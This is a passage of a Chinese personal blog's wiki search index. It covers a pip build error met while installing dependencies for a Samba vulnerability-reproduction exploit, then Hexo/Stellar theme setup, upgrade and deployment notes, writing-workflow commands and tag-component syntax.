./config.status config.status: creating src/config.h building &#x27;Crypto.PublicKey._fastmath&#x27; extension creating build/temp.linux-x86_64-2.7 creating build/temp.linux-x86_64-2.7/src x86_64-linux-gnu-gcc -pthread -fno-strict-aliasing -Wdate-time -D_FORTIFY_SOURCE=2 -ffile-prefix-map=/build/python2.7-8IS1Qc/python2.7-2.7.18=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -std=c99 -O3 -fomit-frame-pointer -Isrc/ -I/usr/include/ -I/usr/include/python2.7 -c src/_fastmath.c -o build/temp.linux-x86_64-2.7/src/_fastmath.o src/_fastmath.c:31:10: fatal error: Python.h: No such file or directory 31 | #include &quot;Python.h&quot; | ^~~~~~~~~~ compilation terminated. error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1 ---------------------------------------- ERROR: Failed building wheel for pycrypto Running setup.py clean for pycrypto Building wheel for impacket (setup.py) ... done Created wheel for impacket: filename=impacket-0.9.16.dev0-py2-none-any.whl size=1263708 sha256=d158770b6ad3a879d737cbe52ef4f12e649acde7168dd5eab20f6f05aa7e4591 Stored in directory: /tmp/pip-ephem-wheel-cache-4l6X3Z/wheels/3f/bd/9d/20149bb82f419124e5c1ac5af149153f15508adf611abc9e26Successfully built impacketFailed to build pycryptoInstalling collected packages: pycrypto, pyasn1, impacket Running setup.py install for pycrypto ... error ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /tmp/pip-record-wHqAzo/install-record.txt --single-version-externally-managed --compile --install-headers /usr/local/include/python2.7/pycrypto cwd: /tmp/pip-install-lukwux/pycrypto/ Complete output (156 lines): running install running build running build_py creating build creating build/lib.linux-x86_64-2.7 creating build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/pct_warnings.py -&gt; build/lib.linux-x86_64-2.7/Crypto creating build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/hashalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash creating build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/blockalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_OAEP.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher creating build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/randpool.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py21compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/RFC1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/_number_new.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py3compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util creating build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/_UserFriendlyRNG.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random creating build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/rng_base.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/st_common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_oaep.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_rfc1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_importKey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_rpoolcompat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_generic.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_pss.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature creating build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/Chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol creating build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_slowmath.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/pubkey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_PSS.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature running build_ext running build_configure building &#x27;Crypto.PublicKey._fastmath&#x27; extension creating build/temp.linux-x86_64-2.7 creating build/temp.linux-x86_64-2.7/src x86_64-linux-gnu-gcc -pthread -fno-strict-aliasing -Wdate-time -D_FORTIFY_SOURCE=2 -ffile-prefix-map=/build/python2.7-8IS1Qc/python2.7-2.7.18=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -std=c99 -O3 -fomit-frame-pointer -Isrc/ -I/usr/include/ -I/usr/include/python2.7 -c src/_fastmath.c -o build/temp.linux-x86_64-2.7/src/_fastmath.o src/_fastmath.c:31:10: fatal error: Python.h: No such file or directory 31 | #include &quot;Python.h&quot; | ^~~~~~~~~~ compilation terminated. error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1 ---------------------------------------- ERROR: Command errored out with exit status 1: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /tmp/pip-record-wHqAzo/install-record.txt --single-version-externally-managed --compile --install-headers /usr/local/include/python2.7/pycrypto Check the logs for full command output. 从错误信息来看，问题出现在尝试安装pycrypto库时。错误的关键在于缺少Python开发头文件（Python.h），这通常是因为没有安装Python的开发包。在Linux系统中，特别是像Kali这样的基于Debian的系统，您可以安装Python开发包以解决这个问题。 安装Python 2开发包： 这个包包含了编译一些Python扩展所需的头文件和库。在终端中运行以下命令来安装 1sudo apt-get install python2-dev 重新尝试安装pycrypto 1sudo python2 -m pip install -r requirements.txt 参考链接 参考链接🔗 备注 Samba 远程命令执行漏洞（CVE-2017-7494） 启动环境和exp执行命令参考 exploit-CVE-2017-7494 exp，是python2，需要安装相关依赖"},{"title":"文章模板","path":"/wiki/vuln_reproduction/文章模板_漏洞复现.html","content":"漏洞信息 名称/编号 影响范围 已复现版本 测不通的版本 漏洞复现 环境拓扑 虚拟机 ip 版本 靶机环境要求 参考链接 参考链接🔗 备注"},{"title":"备份与升级","path":"/wiki/stellar/备份与升级.html","content":"这篇文章讲述如何备份博客和平稳升级Stellar主题，确保数据安全和网站的最新性。 版本对比及更新记录 1.19.0(含)之前的版本是旧版wiki 1.20.0以后是新版wiki 1.21.0版wiki页面project会默认带图片 1.25.0版本开始新增专栏功能 1.26.0版及以上： 可以自定义侧边栏背景（纯色/渐变/图片） wiki配置字段发生部分变化 用1.19版本在一年左右，使用下来除了wiki文章出现因为Sections原因需要对文章order重新排序的不便外，其实没啥更新的必要。 2023年2、3月？使用当时Stellar最新版作为博客，完成从butterfly主题文章的迁移2024年2月22日开始的一段时间将stellar从1.19.0版本升级到1.25.0版本，并陆续迁移文章升级心路历程：升到1.20.0就能用新版wiki1.21.0wiki页面project默认带图片，俺没找到图片关闭方法1.25.0有专栏功能1.26.0版本以上侧边栏感觉变花了不和谐，设置为透明，导航栏和toc风格又变了，整体页面不和谐权衡之下，project默认带图片这点可以稍微忍受，于是升到1.25.0如果哪位知道wiki页面project默认带图片如何关闭请告诉俺一声，不胜感激"},{"title":"Stellar搭建和部署","path":"/wiki/stellar/Stellar搭建和部署.html","content":"这篇文章介绍如何在Hexo环境下使用Stellar主题进行网站搭建，包括配置步骤和部署到静态网页的方法。 安装Hexo 安装git，检查git是否安装成功 1git --version 安装Node.js，检测nodejs和npm是否安装成功 1node -v 1npm -v 全局安装Hexo 1npm install -g hexo-cli Hexo初始化并使用stellar主题 创建今后放置博客的文件夹，cmd cmd123cd /d E:\\mkdir _MyStellarBlog_v1.25.0cd _MyStellarBlog_v1.25.0 右键Git Bash here 博客根目录1hexo init #初始化博客 回显12345INFO Cloning hexo-starter https://github.com/hexojs/hexo-starter.gitINFO Install dependencies&#x27;npm&#x27; is not recognized as an internal or external command,operable program or batch file.WARN Failed to install dependencies. Please run &#x27;npm install&#x27; in &quot;E:\\_MyStellarBlog_v1.25.0&quot; folder. 1npm install 这步可能有报错 尝试在本地预览 1hexo clean &amp;&amp; hexo s 可能会出现的回显123ERROR Cannot find module &#x27;hexo&#x27; from &#x27;E:\\_MyStellarBlog_v1.25.0&#x27;ERROR Local hexo loading failed in E:\\_MyStellarBlog_v1.25.0ERROR Try running: &#x27;rm -rf node_modules &amp;&amp; npm install --force&#x27; 在git bash执行 1rm -rf node_modules &amp;&amp; npm install --force 再尝试在本地预览 1hexo s 执行成功，访问localhost:4000看到网页，即搭建成功 更换为stellar主题 用git或npm方式启用stellar主题 这里以npm为例，@后的数字是指定版本号 1npm i hexo-theme-stellar@1.25.0 在 blog/_config.yml 文件中找到并修改 1theme: stellar 在本地预览 1hexo clean &amp;&amp; hexo s 用npm方式安装的主题，将_MyStellarBlog_v1.25.0 ode_modules\\hexo-theme-stellar下的yml改名为_config.stellar.yml拷贝到博客根目录 在这个文件中的配置信息优先级高于主题文件夹中的配置文件，版本更新只会更新_config.yml文件 参考stellar手册个性化修改 官方文档总是保持最新状态，旧版本的配置信息（一些字段）可能会发生变化，所以旧版本参考最新版官方文档可能不准确 参考链接 后面整理：https://zhuanlan.zhihu.com/p/26625249 https://www.cnblogs.com/visugar/p/6821777.html https://yangtao.site/2018/04/08/hexo/ https://www.cnblogs.com/visugar/p/6821777.html https://yangtao.site/2018/07/06/hexo-order/ 部署 安装插件1npm install hexo-deployer-git --save 修改配置文件中的部署： _config.yml1234567# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repo: https://github.com/Misc0101/Misc0101.github.io.git branch: master message: &quot;Update at &#123;&#123; now(&#x27;YYYY-MM-DD HH:mm:ss Z&#x27;) &#125;&#125;&quot;"},{"title":"日常工作流","path":"/wiki/stellar/日常工作流.html","content":"写作 生成一篇post 1hexo new post &quot;My New Post&quot; 将在_post/下生成My New Post.md文件。然后将My New Post.md移动到blog文件夹里 在wiki下生成 1hexo new page --path /wiki/stellar/&quot;My New Wiki&quot; &quot;My New Wiki&quot; 将在/wiki/stellar/下生成My New Post.md文件，front-matter中的title为：My New Wiki（命令中后面的那个&quot;My New Wiki&quot;） 需要修改md中front-matter的wiki字段指向项目ID 本地预览 1hexo clean &amp;&amp; hexo s -p 5000 默认4000端口，如果端口被占用，额外用-p参数换端口 生成本地静态文件 1hexo g More info: Generating 部署 1hexo d 常说的三连 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 置顶功能 在front-matter中使用pin: true或sticky: 数字 sticky方式置顶，数字越大，置得越顶 使用pin: true方式会在对应的文章多一个赞的小徽章 1pin: true 1sticky: 数字 注：1.26.0版本后不再支持 pin: true 来置顶，因为官方已经支持该功能，方法为： sticky: 数字 合并单元的表格 参考：Markdown表格、单元格合并、快速编辑表格 法一：编辑器在线表格（根据表格自动生成HTML语言）https://www.tablesgenerator.com/markdown_tables 法二：在Excel填好表格后，截图，发给gpt，prompt： 1你好，ChatGPT。我将发送给你一些含有表格的图片，这个表格特别之处在于它包含了合并的单元格。我需要你专注于表格的内容和单元格合并的情况，并将图中的每个表格分别转换成HTML格式。在转换时，请确保正确反映出哪些单元格被合并了，以及它们的具体内容。不需要太过关注其他细节，如字体、颜色或边框样式。请提供转换后的HTML代码。 1你好，ChatGPT。我从Excel中复制了一个表格的内容并粘贴到了记事本中，以便将其发送给你。我需要你根据记事本中的内容来判断哪些单元格在原始Excel表格中是合并的，并将其转换成HTML格式，以便可以嵌入到Markdown文件中。请根据文本格式识别合并的单元格，并提供准确的HTML代码来反映这些合并。 将Excel表格内容复制到notepad中，然后将notepad中的内容发给gpt 1谢谢，请在根据如下内容进行转换"},{"title":"标签组件语法","path":"/wiki/stellar/标签组件语法.html","content":"这篇文章记录Stellar主题支持的各种标签语法，帮助自己更精准地使用标签来丰富内容展示。 搬运于: 表达类标签组件（19+个） 数据类标签组件（6个） 容器类标签组件（11个） 注意事项 有些标签要注意成对出现，否则hexo s会报错，大概率是标签的问题 之前出现过的问题： 问题修正123&#123;% quot 练习 el:h2 %&#125;1)段寄存器只能看见16位，如何证明有96位? 把)去掉 123&#123;% quot 练习 el:h2 %&#125;段寄存器只能看见16位，如何证明有96位? 类别 表达类标签组件（19+个）：quot引用，彩色备注块，link链接卡片，okr 目标管理，navbar 导航栏 数据类标签组件（6个）：timeline 时间线 容器类标签组件（11个）：彩色代码块，grid网格分区 常用 quot引用 效果写法Stellar 是最好用的主题 Stellar 是最好用的主题 热门话题 热门话题1234567&#123;% quot Stellar 是最好用的主题 %&#125;&#123;% quot Stellar 是最好用的主题 el:h2 %&#125;&#123;% quot 热门话题 icon:hashtag %&#125;&#123;% quot 热门话题 icon:default %&#125; 此外，加上 el:h2/h3/h4/h5/h6 可以作为标题使用 folders多个折叠容器聚合 题目1…题目2… 过程… 写法如下： 123456&#123;% folders %&#125;&lt;!-- folder 题目1 --&gt;...&lt;!-- folder 题目2 --&gt;...&#123;% endfolders %&#125; 1234&#123;% folders %&#125;&lt;!-- folder 过程 --&gt;...&#123;% endfolders %&#125; tabs分栏容器 效果： 图片代码块表格假装这里有一张图12let x = 123print(&quot;hello world&quot;) a b c a1 b1 c1 a2 b2 c2 写法： 12345678&#123;% tabs active:1 align:center %&#125;&lt;!-- tab 图片 --&gt;&lt;!-- tab 代码块 --&gt;&lt;!-- tab 表格 --&gt;&#123;% endtabs %&#125; grid网格分区+彩色代码块 1.21.0版本后ablock 标签组件重命名为 box (批量替换即可） 1.24.0版本后网格组件 grid 中的分隔符写法变更，现在仅支持 &lt;!-- cell --&gt; 固定写法 效果写法 推荐的写法123func test() &#123; // ...&#125; 不推荐的写法123func test() -&gt; () &#123; // ...&#125; c:2是固定为2列 123456789101112131415161718192021222324&#123;% grid c:2 %&#125;&lt;!-- cell --&gt;**推荐的写法**&#123;% box child:codeblock color:green %&#125;```swiftfunc test() &#123; // ...&#125;```&#123;% endbox %&#125;&lt;!-- cell --&gt;**不推荐的写法**&#123;% box child:codeblock color:red %&#125;```swiftfunc test() -&gt; () &#123; // ...&#125;```&#123;% endbox %&#125;&#123;% endgrid %&#125; 固定两列： 效果写法 1123 1123 12345678910&#123;% grid c:2 %&#125;&lt;!-- cell --&gt;...&lt;!-- cell --&gt;...&#123;% endgrid %&#125; 收录 彩色备注块 一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 全部颜色效果写法一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 